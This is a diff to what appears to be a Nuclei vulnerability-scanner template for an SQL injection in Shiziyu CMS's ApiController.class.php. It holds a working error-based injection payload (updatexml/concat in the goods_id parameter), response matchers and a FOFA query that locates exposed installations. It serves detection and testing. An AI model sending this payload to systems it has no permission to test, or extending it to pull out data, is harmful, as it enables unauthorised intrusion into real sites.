@@ -1,26 +1,32 @@
 id: shiziyu-cms-apicontroller-sqli
 
 info:
-  name: shiziyu-cms-apicontroller-sqli
+  name: Shiziyu CMS Api Controller - SQL Injection
   author: SleepingBag945
   severity: high
   description: |
-    狮子鱼CMS ApiController.class.php  参数过滤存在不严谨，导致SQL注入漏洞
+    Shiziyu CMS ApiController.class.php parameter filtering is not rigorous, resulting in SQL injection vulnerability.
   metadata:
+    max-request: 1
+    verified: true
     fofa-query: body="/seller.php?s=/Public/login"
   tags: sqli
 
+variables:
+  num: "999999999"
+
 http:
-  - raw:
-      - |
-        GET /index.php?s=api/goods_detail&goods_id=1%20and%20updatexml(1,concat(0x7e,md5(1),0x7e),1)  HTTP/1.1
-        Host: {{Hostname}}
-        User-Agent: Mozilla/5.0(X11; Linux x86_64; rv:12.0) Gecko/20100101 Firefox/12.0
+  - method: GET
+    path:
+      - "{{BaseURL}}/index.php?s=api/goods_detail&goods_id=1%20and%20updatexml(1,concat(0x7e,md5({{num}}),0x7e),1)"
 
-
-
+    matchers-condition: and
     matchers:
-      - type: dsl
-        dsl:
-          - 'status_code_1 == 404 && contains(body_1,"c4ca4238a0b923820dcc509a6f75849") && contains(body_1,"syntax error")'
-        condition: and
+      - type: word
+        part: body
+        words:
+          - 'c8c605999f3d8352d7bb792cf3fdb25'
+
+      - type: status
+        status:
+          - 404
